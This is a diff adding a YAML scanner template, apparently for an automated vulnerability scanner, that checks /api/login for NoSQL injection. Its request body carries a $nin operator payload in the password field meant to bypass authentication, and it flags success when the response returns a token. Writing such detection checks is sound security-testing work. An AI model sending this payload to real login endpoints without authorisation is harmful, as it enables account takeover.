@@ -1,0 +1,21 @@
+id: nosql-26
+name: 'NoSQL $nin in password'
+severity: high
+type: active
+tags:
+  - nosql
+  - injection
+  - api
+description: 'NoSQL operator $nin accepted on /api/login'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"password":{"$nin":""},"extra":"x"}'
+    match-all: true
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        part: body
+        regex:
+          - '"token"\s*:'
